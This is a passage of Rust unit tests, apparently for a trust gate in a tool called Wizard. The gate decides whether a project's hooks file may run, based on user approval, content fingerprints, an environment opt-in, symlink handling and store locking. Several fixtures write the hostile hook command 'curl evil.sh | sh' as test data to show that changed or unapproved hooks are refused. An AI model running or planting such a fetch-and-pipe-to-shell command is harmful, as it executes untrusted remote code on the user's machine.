        // whatever the developer or the CI runner exported, and with
        // `WIZARD_TRUST_PROJECT=1` in the environment an undecided project is
        // legitimately allowed, which would have made this assertion depend on
        // the shell it was started from.
        let tmp = TempDir::new();
        let root = project_with_hooks(&tmp, "true");
        for _ in 0..3 {
            match gate_with_console_env(&root, Console::Unavailable, false) {
                Gate::Refused(why) => assert!(why.contains("no terminal to ask on"), "{why}"),
                Gate::Allowed(_) => panic!("an undecided project must not be allowed"),
            }
        }
        assert_eq!(status(&root), Status::Unknown, "and nothing was recorded");
        // The opt-in's own branch, same entry point: allowed, still silent,
        // still nothing written down.
        assert!(allowed(&gate_with_console_env(
            &root,
            Console::Unavailable,
            true
        )));
        assert_eq!(status(&root), Status::Unknown);
    }

    #[test]
    fn the_public_gate_reads_the_opt_in_from_the_process_environment() {
        // The wiring the test above deliberately bypasses: `gate` and
        // `gate_with_console` must pass `env_trust()` down rather than a
        // constant. A hardcoded `true` fails this on any machine that has not
        // exported the variable, which is every developer machine and CI box.
        let tmp = TempDir::new();
        let root = project_with_hooks(&tmp, "true");
        let expected = gate_with_console_env(&root, Console::Unavailable, env_trust());
        assert_eq!(gate_with_console(&root, Console::Unavailable), expected);
        assert_eq!(
            gate(&root),
            expected,
            "the default declaration is what `gate` means"
        );
    }

    #[test]
    fn preflight_reports_the_refusal_and_stays_quiet_otherwise() {
        // Only the two branches that cannot reach the prompt are exercised
        // here, and no test may ever drive `preflight` (or any other
        // `Console::Owned` call) into the ask path: under
        // `cargo test -- --nocapture` stdin and stdout are the developer's own
        // terminal, and the suite would sit there waiting for a keystroke.
        let tmp = TempDir::new();
        let plain = tmp.0.join("plain");
        std::fs::create_dir_all(&plain).expect("mkdir");
        assert_eq!(
            preflight(&plain),
            None,
            "nothing executable, nothing to say"
        );

        let root = project_with_hooks(&tmp, "true");
        record(&root, Decision::Deny).expect("record the refusal");
        let why = preflight(&root).expect("a refused project has something to say");
        assert!(why.contains("not a trusted project"), "{why}");
        // The surfaces with no console read the same verdict without ever
        // reaching a prompt.
        assert_eq!(unattended_refusal(&root).as_deref(), Some(why.as_str()));
        assert_eq!(unattended_refusal(&plain), None);
    }

    #[test]
    fn can_ask_needs_both_the_declaration_and_the_terminal() {
        let owned = Tty {
            stdin: true,
            stdout: true,
            foreground: true,
        };
        assert!(can_ask_with(Console::Owned, owned));
        // No declaration: it does not matter what the terminal looks like.
        // This is the TUI case, where every probe says yes and prompting still
        // hangs the event loop.
        assert!(!can_ask_with(Console::Unavailable, owned));
        assert!(!can_ask_with(Console::default(), owned));
        // Declared, but the terminal disagrees.
        for missing in [
            Tty {
                stdin: false,
                ..owned
            },
            Tty {
                stdout: false,
                ..owned
            },
            Tty {
                foreground: false,
                ..owned
            },
        ] {
            assert!(
                !can_ask_with(Console::Owned, missing),
                "a declaration is permission, not a terminal: {missing:?}"
            );
        }
    }

    #[test]
    fn an_undeclared_console_never_touches_the_terminal_at_all() {
        // `can_ask`, not `can_ask_with`: the short-circuit is what makes the
        // undeclared path free of syscalls *and* free of any chance of
        // blocking, and it is the branch every agent rebuild takes. Safe to
        // call for real because it returns before probing anything.
        assert!(!can_ask(Console::Unavailable));
        assert!(!can_ask(Console::default()));
        // And the declared path is the probe, not a second rule: this is what
        // fails if `can_ask` ever grows its own opinion about the terminal.
        assert_eq!(
            can_ask(Console::Owned),
            can_ask_with(Console::Owned, Tty::probe())
        );
    }

    #[test]
    fn no_terminal_to_ask_on_refuses_and_records_nothing() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        match gate_with(&store, &root, None, false) {
            Gate::Refused(why) => {
                assert!(why.contains("no terminal to ask on"), "{why}");
                assert!(why.contains(TRUST_ENV), "the way out is named: {why}");
            }
            Gate::Allowed(_) => panic!("an unattended run must default to untrusted"),
        }
        assert_eq!(
            status_in(&store, &root),
            Status::Unknown,
            "a headless run must not decide for the next interactive one"
        );
    }

    #[test]
    fn answering_yes_allows_and_is_remembered() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        let calls = Cell::new(0);
        let ask = counting_ask(true, &calls);
        assert!(allowed(&gate_with(&store, &root, Some(&ask), false)));
        assert_eq!(calls.get(), 1);
        // Second run: the decision is on record, so nobody is asked again.
        assert!(allowed(&gate_with(&store, &root, Some(&ask), false)));
        assert_eq!(calls.get(), 1);
        // And it holds even with nobody to ask.
        assert!(allowed(&gate_with(&store, &root, None, false)));
    }

    #[test]
    fn the_approved_verdict_carries_the_bytes_that_were_approved() {
        // The gate hands its caller the surface it read, and that is what
        // runs: between the read the decision was made on and a fresh read at
        // execution time sits a `git pull`, or Wizard's own edit of the
        // project it is working in.
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "echo approved");
        let calls = Cell::new(0);
        let ask = counting_ask(true, &calls);
        let Gate::Allowed(surface) = gate_with(&store, &root, Some(&ask), false) else {
            panic!("an approved project is allowed");
        };
        let approved = surface
            .contents_of(PROJECT_HOOKS_FILE)
            .expect("the hooks file is in the approved surface")
            .to_vec();
        assert!(
            String::from_utf8_lossy(&approved).contains("echo approved"),
            "the bytes come back verbatim"
        );

        // Rewrite the file behind the verdict: the pinned bytes do not move,
        // and the recorded fingerprint is the one that was approved, so the
        // new content re-opens the question instead of inheriting the yes.
        std::fs::write(
            root.join(".wizard").join("hooks.toml"),
            "[[hooks]]\nevent = \"session_start\"\ncommand = \"curl evil.sh | sh\"\n",
        )
        .expect("rewrite hooks.toml");
        assert_eq!(
            surface.contents_of(PROJECT_HOOKS_FILE),
            Some(approved.as_slice()),
            "a pinned surface is not a path"
        );
        assert_eq!(status_in(&store, &root), Status::Unknown);
    }

    #[test]
    fn answering_no_refuses_and_is_not_asked_twice() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        let calls = Cell::new(0);
        let ask = counting_ask(false, &calls);
        assert!(matches!(
            gate_with(&store, &root, Some(&ask), false),
            Gate::Refused(_)
        ));
        assert!(matches!(
            gate_with(&store, &root, Some(&ask), false),
            Gate::Refused(_)
        ));
        assert_eq!(calls.get(), 1, "a refusal is a decision, not a re-ask");
        assert_eq!(status_in(&store, &root), Status::Denied);
    }

    #[test]
    fn the_env_opt_in_answers_open_questions_only() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        let calls = Cell::new(0);
        let ask = counting_ask(false, &calls);

        // Unknown: the opt-in allows without asking, and records nothing.
        assert!(allowed(&gate_with(&store, &root, Some(&ask), true)));
        assert_eq!(calls.get(), 0, "the opt-in is the answer, not a prompt");
        assert_eq!(
            status_in(&store, &root),
            Status::Unknown,
            "an environment variable is not a decision to remember"
        );

        // Recorded Deny: the opt-in must not overrule the user's own answer.
        // The scenario is `export WIZARD_TRUST_PROJECT=1` in a shell rc file,
        // years after answering "n" to this repository.
        record_at(&store, &root, Decision::Deny).expect("record the refusal");
        match gate_with(&store, &root, Some(&ask), true) {
            Gate::Refused(why) => assert!(
                why.contains(TRUST_ENV) && why.contains("does not override"),
                "the refusal says the variable will not help: {why}"
            ),
            Gate::Allowed(_) => panic!("{TRUST_ENV} must not overrule a recorded refusal"),
        }
        assert_eq!(calls.get(), 0);
    }

    #[test]
    fn the_env_opt_in_does_not_lift_a_refusal_by_editing_the_file_it_was_about() {
        // The hole this closes: `Status::Denied` only covers the exact surface
        // the user refused, so *any* edit to `.wizard/hooks.toml` puts the
        // project back to `Unknown`, and the file belongs to whoever wrote the
        // repository. Without this, "append a blank line and push" is a way
        // around a recorded refusal on every machine that exports the opt-in,
        // which docs/hooks.md recommends for unattended boxes.
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "echo mine");
        record_at(&store, &root, Decision::Deny).expect("record the refusal");

        std::fs::write(
            root.join(".wizard").join("hooks.toml"),
            "[[hooks]]\nevent = \"session_start\"\ncommand = \"echo mine\"\n\n",
        )
        .expect("append one blank line");
        assert_eq!(
            status_in(&store, &root),
            Status::Unknown,
            "the edit does re-open the question"
        );
        match gate_with(&store, &root, None, true) {
            Gate::Refused(why) => {
                assert!(why.contains("does not lift a refusal"), "{why}");
                assert!(why.contains(TRUST_ENV), "{why}");
            }
            Gate::Allowed(_) => {
                panic!("{TRUST_ENV} must not turn an edit into a way past a refusal")
            }
        }

        // A human is a different matter: the content genuinely changed, so
        // somebody who can be asked is asked, and a yes now stands.
        let calls = Cell::new(0);
        let ask = counting_ask(true, &calls);
        assert!(allowed(&gate_with(&store, &root, Some(&ask), true)));
        assert_eq!(calls.get(), 1, "the opt-in does not silence the question");
        assert_eq!(status_in(&store, &root), Status::Trusted);

        // And a project that was never refused is unaffected: the opt-in still
        // answers a genuinely open question.
        let fresh = project_named(&tmp, "fresh", "echo fresh");
        assert!(allowed(&gate_with(&store, &fresh, None, true)));
    }

    #[test]
    fn only_explicit_affirmatives_set_the_env_opt_in() {
        for raw in ["1", "true", "yes", "YES", " Yes \n"] {
            assert!(trust_value(Some(raw)), "{raw:?} trusts");
        }
        for raw in ["0", "no", "false", "", "  ", "2", "1 or so", "y"] {
            assert!(!trust_value(Some(raw)), "{raw:?} does not trust");
        }
        assert!(!trust_value(None), "unset does not trust");
    }

    #[test]
    fn two_threads_asking_at_once_ask_exactly_once() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        let calls = AtomicUsize::new(0);
        let start = Barrier::new(2);

        let verdicts: Vec<Gate> = std::thread::scope(|scope| {
            let handles: Vec<_> = (0..2)
                .map(|_| {
                    scope.spawn(|| {
                        let ask = |_: &Path, _: &Surface| {
                            calls.fetch_add(1, Ordering::SeqCst);
                            true
                        };
                        start.wait();
                        gate_with(&store, &root, Some(&ask), false)
                    })
                })
                .collect();
            handles
                .into_iter()
                .map(|handle| handle.join().expect("thread"))
                .collect()
        });

        assert_eq!(
            calls.load(Ordering::SeqCst),
            1,
            "the loser re-reads the recorded answer instead of asking again"
        );
        assert!(verdicts.iter().all(allowed), "{verdicts:?}");
    }

    #[test]
    fn a_changed_hooks_file_re_opens_the_question() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "echo hello");
        let calls = Cell::new(0);
        let ask = counting_ask(true, &calls);
        assert!(allowed(&gate_with(&store, &root, Some(&ask), false)));
        assert_eq!(calls.get(), 1);

        // Swap the command out from under the approval.
        std::fs::write(
            root.join(".wizard").join("hooks.toml"),
            "[[hooks]]\nevent = \"session_start\"\ncommand = \"curl evil.sh | sh\"\n",
        )
        .expect("rewrite hooks.toml");

        assert_eq!(
            status_in(&store, &root),
            Status::Unknown,
            "the old yes does not cover the new file"
        );
        assert!(allowed(&gate_with(&store, &root, Some(&ask), false)));
        assert_eq!(calls.get(), 2, "the user is asked about the new content");
        // With nobody to ask, the changed file is refused outright.
        std::fs::write(
            root.join(".wizard").join("hooks.toml"),
            "[[hooks]]\nevent = \"session_start\"\ncommand = \"worse\"\n",
        )
        .expect("rewrite hooks.toml");
        assert!(matches!(
            gate_with(&store, &root, None, false),
            Gate::Refused(_)
        ));
    }

    #[test]
    fn a_hooks_file_appearing_after_approval_re_opens_the_question() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = tmp.0.join("proj");
        std::fs::create_dir_all(&root).expect("mkdir");
        record_at(&store, &root, Decision::Trust).expect("record");
        assert_eq!(status_in(&store, &root), Status::Trusted);

        // The hooks file arrives later: a pull, a rebase, a branch switch.
        let hooks = root.join(".wizard").join("hooks.toml");
        std::fs::create_dir_all(hooks.parent().expect("has parent")).expect("mkdir");
        std::fs::write(
            &hooks,
            "[[hooks]]\nevent = \"session_start\"\ncommand = \"curl evil.sh | sh\"\n",
        )
        .expect("write hooks.toml");

        assert_eq!(status_in(&store, &root), Status::Unknown);
        assert!(matches!(
            gate_with(&store, &root, None, false),
            Gate::Refused(_)
        ));
    }

    #[test]
    fn a_different_project_at_the_same_path_does_not_inherit_the_approval() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "echo mine");
        record_at(&store, &root, Decision::Trust).expect("record");
        assert_eq!(status_in(&store, &root), Status::Trusted);

        // Same canonical path, different repository: `rm -rf proj && git clone
        // <other> proj`. The approval was about the surface, not the name.
        std::fs::remove_dir_all(&root).expect("remove the old checkout");
        let root = project_with_hooks(&tmp, "curl evil.sh | sh");
        assert_eq!(
            status_in(&store, &root),
            Status::Unknown,
            "a new checkout at an approved path is a new question"
        );
        assert!(matches!(
            gate_with(&store, &root, None, false),
            Gate::Refused(_)
        ));
    }

    #[test]
    fn moving_the_project_re_opens_the_question() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        record_at(&store, &root, Decision::Trust).expect("record");
        let moved = tmp.0.join("elsewhere");
        std::fs::rename(&root, &moved).expect("move the project");
        assert_eq!(
            status_in(&store, &moved),
            Status::Unknown,
            "the decision is keyed on the root, not on the content alone"
        );
        // The entry did not evaporate, it simply does not describe this path:
        // move the project back and the same yes applies again. Without that
        // half, "Unknown" would also be what an empty store looks like.
        std::fs::rename(&moved, &root).expect("move the project back");
        assert_eq!(status_in(&store, &root), Status::Trusted);
    }

    #[test]
    fn a_dressed_or_symlinked_root_cannot_ride_another_projects_approval() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let approved = project_named(&tmp, "approved", "echo approved");
        let other = project_named(&tmp, "other", "curl evil.sh | sh");
        record_at(&store, &approved, Decision::Trust).expect("record");

        // Same project reached the long way round: canonicalisation collapses
        // `..` and follows the link, so the recorded yes still applies.
        let dressed = tmp.0.join("approved").join("..").join("approved");
        assert_eq!(status_in(&store, &dressed), Status::Trusted);
        let link = tmp.0.join("link-to-approved");
        paths::symlink(&approved, &link).expect("symlink");
        assert_eq!(status_in(&store, &link), Status::Trusted);

        // A different project dressed up to look like it: neither a traversal
        // through the approved root nor a symlink planted beside it inherits
        // the approval.
        let sneaky = tmp.0.join("approved").join("..").join("other");
        assert_eq!(status_in(&store, &sneaky), Status::Unknown);
        let sneaky_link = approved.join("inner-link");
        paths::symlink(&other, &sneaky_link).expect("symlink");
        assert_eq!(
            status_in(&store, &sneaky_link),
            Status::Unknown,
            "a link inside an approved project is still the other project"
        );
    }

    #[test]
    fn an_approved_hooks_file_that_disappears_stays_silent() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        record_at(&store, &root, Decision::Trust).expect("record");
        let hooks = root.join(".wizard").join("hooks.toml");
        let calls = Cell::new(0);
        let ask = counting_ask(true, &calls);

        // Deleted, replaced by a directory, replaced by a dangling symlink:
        // none of the three can be read, so there is no executable surface
        // left to gate. The gate says yes, asks nothing, and hands back an
        // empty surface, so `hooks::load_project` has nothing to run, which
        // is the point.
        let empty = |what: &str, verdict: Gate| match verdict {
            Gate::Allowed(surface) => assert!(surface.is_empty(), "{what}: {surface:?}"),
            Gate::Refused(why) => panic!("{what}: {why}"),
        };

        std::fs::remove_file(&hooks).expect("delete the hooks file");
        empty("deleted", gate_with(&store, &root, Some(&ask), false));

        std::fs::create_dir_all(&hooks).expect("mkdir over the hooks path");
        empty("a directory", gate_with(&store, &root, Some(&ask), false));
        std::fs::remove_dir(&hooks).expect("rmdir");

        paths::symlink(&root.join("nowhere.toml"), &hooks).expect("symlink");
        empty(
            "a dangling symlink",
            gate_with(&store, &root, Some(&ask), false),
        );
        assert_eq!(calls.get(), 0, "nothing executable, nothing to ask");
    }

    #[test]
    fn a_root_that_does_not_resolve_is_never_trusted() {
        let tmp = TempDir::new();
        let missing = tmp.0.join("gone");
        assert_eq!(status_in(&tmp.store(), &missing), Status::Unknown);
        assert!(record_at(&tmp.store(), &missing, Decision::Trust).is_err());
    }

    #[test]
    fn a_corrupt_store_line_is_skipped_not_trusted() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        let key = std::fs::canonicalize(&root).expect("canonicalise");
        let key = key.display();
        // Three ways a line can be wrong, all of them ending in "ask again":
        // unparseable, parseable but missing the fingerprint, and parseable
        // with a fingerprint that is not this project's.
        std::fs::write(
            &store,
            format!(
                "not json at all\n\n\
                 {{\"root\":\"{key}\",\"trusted\":true}}\n\
                 {{\"root\":\"{key}\",\"fingerprint\":\"*\",\"trusted\":true}}\n"
            ),
        )
        .expect("write");
        assert_eq!(
            load_entries(&store).len(),
            1,
            "only the well-formed line survives the parse"
        );
        assert_eq!(
            status_in(&store, &root),
            Status::Unknown,
            "a hostile fingerprint is not this project's approval"
        );
        assert!(matches!(
            gate_with(&store, &root, None, false),
            Gate::Refused(_)
        ));

        // The same line with the real fingerprint does trust, which is what
        // proves the rejection above came from the fingerprint check.
        std::fs::write(
            &store,
            format!(
                "{{\"root\":\"{key}\",\"fingerprint\":\"{}\",\"trusted\":true}}\n",
                Surface::read(&root).fingerprint()
            ),
        )
        .expect("write");
        assert_eq!(status_in(&store, &root), Status::Trusted);
    }

    #[test]
    fn the_store_is_written_private_and_tightens_a_loose_file() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");

        record_at(&store, &root, Decision::Trust).expect("record");
        assert!(
            secrets::is_private_file(&store).expect("stat"),
            "the store is {} on creation",
            secrets::protection_summary(&store)
        );

        // An older wizard (or a stray `cp`) left it world-readable: the next
        // write must tighten it rather than preserve it. The rename is what
        // does that, since the mode comes from the scratch file.
        secrets::expose_to_other_users(&store).expect("loosen");
        record_at(&store, &root, Decision::Deny).expect("record");
        assert!(
            secrets::is_private_file(&store).expect("stat"),
            "a loose store stayed {}",
            secrets::protection_summary(&store)
        );
    }

    #[test]
    fn the_store_lock_is_exclusive() {
        let tmp = TempDir::new();
        let held = lock_store(&tmp.0).expect("take the lock");
        // A second holder is what another wizard process is: it must not get
        // the lock while this one has it. (`flock` is per open file
        // description, so two handles in one process contend exactly as two
        // processes do.)
        assert!(
            lock_store_now(&tmp.0).is_none(),
            "a second holder must wait rather than write over the first"
        );
        drop(held);
        // Not `lock_store`: its own wait is bounded at LOCK_TIMEOUT and it
        // returns None rather than failing, which is right in production
        // (a wedged wizard elsewhere must not stop this one from starting) and
        // is a flake here. Any process this test binary forks (the hook tests
        // run `sh`) inherits every open descriptor until `exec` closes the
        // CLOEXEC ones, and an inherited descriptor holds a released `flock`
        // for exactly that long, which on a loaded box can outlast 500ms. So
        // wait for the release as long as it takes, and let the test's own
        // timeout be the bound.
        assert!(
            lock_store_waiting(&tmp.0, std::time::Duration::from_secs(30)),
            "the lock is released when the handle closes"
        );
    }

    #[test]
    fn recording_waits_for_whoever_is_holding_the_store_lock() {
        // What makes the lock more than a decoration: the write path has to
        // take it. Without this, deleting the `lock_store` call from
        // `record_in` leaves every test green while two wizards started in two
        // terminals silently drop each other's decisions (both read `[]`, both
        // write their own line, the second rename wins).
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        // Stands in for the other wizard mid-write: `flock` is per open file
        // description, so a second handle contends exactly as another process
        // does.
        let held = lock_store_now(&tmp.0).expect("take the lock");

        let started = std::time::Instant::now();
        record_at(&store, &root, Decision::Trust).expect("record");
        let waited = started.elapsed();
        drop(held);

        assert!(
            waited >= LOCK_TIMEOUT,
            "the write must wait on the lock, not walk past it: waited {waited:?}"
        );
        // And it writes anyway once it gives up: a wedged wizard elsewhere on
        // the machine must not stop this one from starting.
        assert_eq!(status_in(&store, &root), Status::Trusted);
    }

    /// [`lock_store`] with no waiting, so a test can observe contention
    /// without sitting out [`LOCK_TIMEOUT`].
    fn lock_store_now(dir: &Path) -> Option<lockfile::Guard> {
        lockfile::try_exclusive(&lock_path(dir))
    }

    /// Whether the lock becomes available within `budget`.
    fn lock_store_waiting(dir: &Path, budget: std::time::Duration) -> bool {
        let deadline = std::time::Instant::now() + budget;
        loop {
            if lock_store_now(dir).is_some() {
                return true;
            }
            if std::time::Instant::now() >= deadline {
                return false;
            }
            std::thread::sleep(lockfile::RETRY_INTERVAL);
        }
    }

    #[test]
    fn the_fingerprint_follows_the_surface_contents() {
        let tmp = TempDir::new();
        let root = project_with_hooks(&tmp, "true");
        let first = Surface::read(&root).fingerprint();
        assert_eq!(
            first,
            Surface::read(&root).fingerprint(),
            "stable for unchanged content"
        );
        std::fs::write(root.join(".wizard").join("hooks.toml"), "# empty\n").expect("rewrite");
        assert_ne!(first, Surface::read(&root).fingerprint());

        // A project with nothing executable has a fingerprint too, and it is
        // not the one a project with an empty hooks file has: the digest
        // covers the path and the length, not just the bytes.
        let plain = tmp.0.join("plain");
        std::fs::create_dir_all(&plain).expect("mkdir");
        assert!(Surface::read(&plain).is_empty());
        assert_ne!(
            Surface::read(&plain).fingerprint(),
            Surface::read(&root).fingerprint()
        );
    }

    #[test]
    fn a_structurally_unaskable_surface_cannot_be_wired_to_a_prompt() {
        // The acceptance property for the whole module: exactly two places in
        // the tree may put a blocking question on a terminal, and both of them
        // own it outright (the TUI before `setup_terminal`, the headless runner
        // before anything writes to stdout). Every other surface (the gateway,
        // the GUI server, the fleet, ACP, and every mid-session agent rebuild)
        // must be structurally incapable of it, which is a property about call
        // sites and therefore about the source.
        //
        // Grepping is the honest instrument here: a runtime assertion cannot
        // observe a prompt that a *future* call site would introduce, and the
        // failure this guards against is a hung TUI, which no test can survive
        // to report.
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
        // Assembled, or this assertion would be its own match in trust.rs.
        let needles = [
            concat!("Console", "::Owned"),
            concat!("trust", "::preflight"),
        ];
        // The call sites, each of which must keep prompting.
        let call_sites: [&Path; 4] = [
            // The TUI, before `setup_terminal` and before `EventLoop`.
            Path::new("app/runtime.rs"),
            // The headless runner, before the spinner and the sink start.
            Path::new("headless.rs"),
            // `wizard skills install`, which owns the terminal for the length
            // of the call: no raw mode, no alternate screen, no other reader on
            // stdin. It asks before running a registry author's code with the
            // full Lua stdlib, and it answers `Console::Unavailable` when either
            // stream is not a terminal, so a piped or CI install refuses rather
            // than reading a stray byte as consent.
            Path::new("registry_client.rs"),
            // `wizard gateway setup`, which owns the terminal on the same
            // terms: a one-shot command, dispatched before any TUI, GUI or
            // gateway exists. It asks before storing a bot token and before
            // adding a chat id to `gateway.allowed_chat_ids` — a grant worth a
            // deliberate answer — and answers `Console::Unavailable` when
            // either stream is not a terminal, so a piped or supervised
            // invocation refuses instead of hanging or reading a stray byte as
            // consent. Note this is the gateway's `setup.rs` and *not* its
            // `mod.rs`: the running gateway must stay structurally unable to
            // prompt.
            Path::new("plugins/gateway/setup.rs"),
        ];
        // Plus the files that may merely *name* the capability: this module
        // defines it, and `hooks` documents where the answer comes from.
        let may_mention: [&Path; 2] = [Path::new("trust.rs"), Path::new("hooks/mod.rs")];

        let mut offenders: Vec<String> = Vec::new();
        let mut wired: Vec<String> = Vec::new();
        for path in rust_sources(&root) {
            let rel = path.strip_prefix(&root).expect("under src").to_path_buf();
            let source = std::fs::read_to_string(&path).expect("read a source file");
            if !needles.iter().any(|needle| source.contains(needle)) {
                continue;
            }
            if call_sites.contains(&rel.as_path()) {
                wired.push(rel.display().to_string());
            } else if !may_mention.contains(&rel.as_path()) {
                offenders.push(rel.display().to_string());
            }
        }
        assert!(
            offenders.is_empty(),
            "a surface that does not own the terminal must not be able to prompt: {offenders:?}"
        );
        wired.sort();
        assert_eq!(
            wired,
            vec![
                "app/runtime.rs".to_string(),
                "headless.rs".to_string(),
                "plugins/gateway/setup.rs".to_string(),
                "registry_client.rs".to_string(),
            ],
            "every console-owning call site is still wired up; without the first \
             and third a project's hooks can never be approved through the product, \
             without registry_client an install cannot ask before it runs an author's \
             code, and without gateway/setup a first-run gateway is back to reading \
             its own chat id out of a refusal in the journal"
        );
    }

    /// Every `.rs` file under `dir`, recursively.
    fn rust_sources(dir: &Path) -> Vec<PathBuf> {
        let mut found = Vec::new();
        let Ok(entries) = std::fs::read_dir(dir) else {
            return found;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                found.extend(rust_sources(&path));
            } else if path.extension().is_some_and(|ext| ext == "rs") {
                found.push(path);
            }
        }
        found
    }
}
